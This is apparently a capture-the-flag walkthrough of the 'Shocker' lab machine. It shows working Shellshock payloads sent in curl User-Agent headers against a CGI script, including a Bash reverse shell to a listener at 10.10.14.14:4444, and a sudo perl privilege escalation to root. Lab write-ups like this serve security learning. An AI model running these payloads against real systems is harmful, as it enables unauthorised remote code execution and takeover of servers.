<img width="694" height="641" alt="image" src="https://github.com/user-attachments/assets/61eee680-9272-48de-8691-0e8ac947de73" />

> How many TCP ports are listening on Shocker?
> 

I start with some scanning 

![image.png](attachment:e39e487d-e462-4549-86f1-8021f63fdda8:image.png)

and the answer is `2`

> What is the name of the directory available on the webserver that is a standard name known for running scripts via the Common Gateway Interface?
> 


- `/cgi-bin/` → Status: 403 (directory exists but not listable)
- `/index.html` → Status: 200
- Other protected files like `.htaccess`, `.htpasswd`

> What is the name of the script in the cgi-bin directory?
> 

<img width="924" height="605" alt="image" src="https://github.com/user-attachments/assets/4e543163-b0ab-4f6a-9ee8-0fe43906c2c2" />

`cgi-bin/user.sh` → Status: 200 

> What 2014 CVE ID describes a remote code execution vulnerability in Bash when invoked through Apache CGI?
> 

<img width="911" height="480" alt="image" src="https://github.com/user-attachments/assets/6b4c265b-c742-43c0-b69b-7d9fcc739fe8" />

> What user is the webserver running as on Shocker?
> 

### Test for Shellshock Vulnerability

**Command:**

bash

`curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://10.129.124.112/cgi-bin/user.sh`

<img width="940" height="99" alt="image" src="https://github.com/user-attachments/assets/7cd2414e-298e-44c2-b9e2-d69586cf7bdf" />

`Shelly` 

> Submit the flag located in the shelly user's home directory.
> 

### Spawn a Reverse Shell

**Listener Setup:**

bash

`nc -lvnp 4444`

**Exploit Payload:**

bash

`curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'" http://10.129.124.112/cgi-bin/user.sh`

**Result:**

- Reverse shell as `shelly` user

<img width="924" height="69" alt="image" src="https://github.com/user-attachments/assets/e65dacc6-a9a4-4870-9fec-1b6de38b0140" />

<img width="932" height="152" alt="image" src="https://github.com/user-attachments/assets/a1a1f113-c48e-4f23-8747-be7d7ab26b4c" />

### Retrieve Shelly’s Flag

**Commands:**

bash

`cd /home/shelly
ls
cat flag.txt`

<img width="921" height="133" alt="image" src="https://github.com/user-attachments/assets/c2230e17-e21d-499e-8ccc-5740cb6fa6b4" />

### Privilege Escalation via Sudo

**Command:**

bash

`sudo -l`

**Result:**

<img width="936" height="134" alt="image" src="https://github.com/user-attachments/assets/7f77b6e0-bc35-4f20-a994-6fa9b4d2a199" />

### Escalate to Root

**Command:**

bash

`sudo /usr/bin/perl -e 'exec "/bin/bash";'`

**Confirm:**

bash

`whoami`

<img width="930" height="342" alt="image" src="https://github.com/user-attachments/assets/28957c3f-0816-474f-be1e-19a7fdadeedc" />

boom thats the flag!
